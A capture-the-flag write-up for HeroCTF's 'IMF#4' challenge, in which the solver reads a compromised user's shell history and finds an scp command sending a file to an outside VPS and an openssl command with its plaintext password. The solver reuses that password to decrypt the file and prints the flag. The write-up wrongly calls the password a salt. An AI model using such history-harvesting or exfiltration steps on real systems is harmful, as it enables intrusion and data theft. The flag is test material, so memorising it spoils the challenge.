# IMF#4: Put the past behind
Category: System

## Description
One more step to go!

\> Deploy on [deploy.heroctf.fr](https://deploy.heroctf.fr/)

Format : **Hero{flag}**

Author : **Log_s**

## Write-up
- After gaining access to the `dave` user on the `dev` server from [IMF#3: admin:admin](../system-imf-3/README.md), we came across a file named `randomfile.txt.enc`.
- Upon examining the contents of the file, it became evident that it was encoded or encrypted.
- To decipher the encoded file, we began investigating around and noticed the challenge's title, which hinted at the significance of the past. This led us to consider the usage of the `history` command, which provides a record of previous commands executed.
- By running the `history` command, we were able to retrieve a list of important commands from prior sessions. The relevant commands were as follows:
```
1  whoami
2  ls
3  vim randomfile.txt
4  zip randomfile.zip randomfile.txt
5  vps=38.243.09.46
6  scp randomfile.txt dave@$vps:~/toSendToBuyer.txt
7  openssl aes-256-cbc -salt -k Sup3r53cr3tP4ssw0rd -in randomfile.txt -out randomfile.txt.enc
```
- Upon examining the `history` output, we discovered that the file had been encoded using the `openssl` command with the `aes-256-cbc` algorithm and a salt value of `Sup3r53cr3tP4ssw0rd`.
- Armed with the necessary information, we proceeded to decode the file using the following command: `openssl aes-256-cbc -d -salt -k Sup3r53cr3tP4ssw0rd -in randomfile.txt.enc -out randomfile.txt.dec`
- The flag can be found in the decoded file.

Flag: `Hero{4_l1ttle_h1st0ry_l3ss0n_4_u}`
